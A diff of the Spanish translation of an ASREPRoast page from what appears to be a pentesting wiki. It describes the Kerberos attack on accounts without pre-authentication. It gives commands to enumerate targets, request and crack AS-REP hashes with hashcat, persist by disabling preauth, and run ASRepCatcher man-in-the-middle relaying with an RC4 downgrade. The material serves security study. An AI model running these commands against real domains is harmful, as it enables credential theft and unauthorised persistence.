@@ -4,15 +4,15 @@
 
 ## ASREPRoast
 
-ASREPRoast es un ataque de seguridad que explota a los usuarios que carecen del **atributo requerido de pre-autenticación de Kerberos**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar autenticación para un usuario desde el Controlador de Dominio (DC) sin necesidad de la contraseña del usuario. El DC luego responde con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar sin conexión para descubrir la contraseña del usuario.
+ASREPRoast es un ataque de seguridad que explota usuarios que carecen del **Kerberos pre-authentication required attribute**. Esencialmente, esta vulnerabilidad permite a los atacantes solicitar la autenticación de un usuario al Domain Controller (DC) sin necesitar la contraseña del usuario. El DC responde entonces con un mensaje cifrado con la clave derivada de la contraseña del usuario, que los atacantes pueden intentar descifrar offline para descubrir la contraseña del usuario.
 
-Los principales requisitos para este ataque son:
+Los requisitos principales para este ataque son:
 
-- **Falta de pre-autenticación de Kerberos**: Los usuarios objetivo no deben tener habilitada esta característica de seguridad.
-- **Conexión al Controlador de Dominio (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
-- **Cuenta de dominio opcional**: Tener una cuenta de dominio permite a los atacantes identificar de manera más eficiente a los usuarios vulnerables a través de consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar los nombres de usuario.
+- **Lack of Kerberos pre-authentication**: Los usuarios objetivo no deben tener esta característica de seguridad habilitada.
+- **Connection to the Domain Controller (DC)**: Los atacantes necesitan acceso al DC para enviar solicitudes y recibir mensajes cifrados.
+- **Optional domain account**: Tener una cuenta de dominio permite a los atacantes identificar de forma más eficiente a usuarios vulnerables mediante consultas LDAP. Sin dicha cuenta, los atacantes deben adivinar nombres de usuario.
 
-#### Enumerando usuarios vulnerables (necesita credenciales de dominio)
+#### Enumeración de usuarios vulnerables (se necesitan credenciales de dominio)
 ```bash:Using Windows
 Get-DomainUser -PreauthNotRequired -verbose #List vuln users using PowerView
 ```
@@ -33,7 +33,13 @@ python GetNPUsers.py jurassic.park/triceratops:Sh4rpH0rns -request -format hashc
 Get-ASREPHash -Username VPN114user -verbose #From ASREPRoast.ps1 (https://github.com/HarmJ0y/ASREPRoast)
 ```
 > [!WARNING]
-> AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado de 0x17 y un tipo de preautenticación de 0.
+> AS-REP Roasting con Rubeus generará un 4768 con un tipo de cifrado 0x17 y tipo de preauth 0.
+
+#### Quick one-liners (Linux)
+
+- Enumera primero los objetivos potenciales (p. ej., desde leaked build paths) con Kerberos userenum: `kerbrute userenum users.txt -d domain --dc dc.domain`
+- Extrae el AS-REP de un solo usuario incluso con una contraseña **vacía** usando `netexec ldap <dc> -u svc_scan -p '' --asreproast out.asreproast` (netexec también muestra la postura de LDAP signing/channel binding).
+- Crack con `hashcat out.asreproast /path/rockyou.txt` – detecta automáticamente **-m 18200** (etype 23) para AS-REP roast hashes.
 
 ### Cracking
 ```bash
@@ -42,7 +48,7 @@ hashcat -m 18200 --force -a 0 hashes.asreproast passwords_kerb.txt
 ```
 ### Persistencia
 
-Forzar **preauth** no requerido para un usuario donde tienes permisos **GenericAll** (o permisos para escribir propiedades):
+Forzar que **preauth** no sea requerido para un usuario sobre el que tengas permisos **GenericAll** (o permisos para escribir propiedades):
 ```bash:Using Windows
 Set-DomainObject -Identity <username> -XOR @{useraccountcontrol=4194304} -Verbose
 ```
@@ -52,8 +58,8 @@ bloodyAD -u user -p 'totoTOTOtoto1234*' -d crash.lab --host 10.100.10.5 add uac 
 ```
 ## ASREProast sin credenciales
 
-Un atacante puede usar una posición de hombre en el medio para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la pre-autenticación de Kerberos esté deshabilitada. Por lo tanto, funciona para todos los usuarios en la VLAN.\
-[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta obliga a las estaciones de trabajo de los clientes a usar RC4 al alterar la negociación de Kerberos.
+Un atacante puede usar una posición man-in-the-middle para capturar paquetes AS-REP mientras atraviesan la red sin depender de que la preautenticación de Kerberos esté deshabilitada. Por lo tanto funciona para todos los usuarios en la VLAN.\
+[ASRepCatcher](https://github.com/Yaxxine7/ASRepCatcher) nos permite hacerlo. Además, la herramienta fuerza a las estaciones de trabajo cliente a usar RC4 al alterar la negociación de Kerberos.
 ```bash
 # Actively acting as a proxy between the clients and the DC, forcing RC4 downgrade if supported
 ASRepCatcher relay -dc $DC_IP
@@ -67,6 +73,7 @@ ASRepCatcher listen
 ## Referencias
 
 - [https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/as-rep-roasting-using-rubeus-and-hashcat)
+- [0xdf – HTB Bruno (AS-REP roast → ZipSlip → DLL hijack)](https://0xdf.gitlab.io/2026/02/24/htb-bruno.html)
 
 ---
 
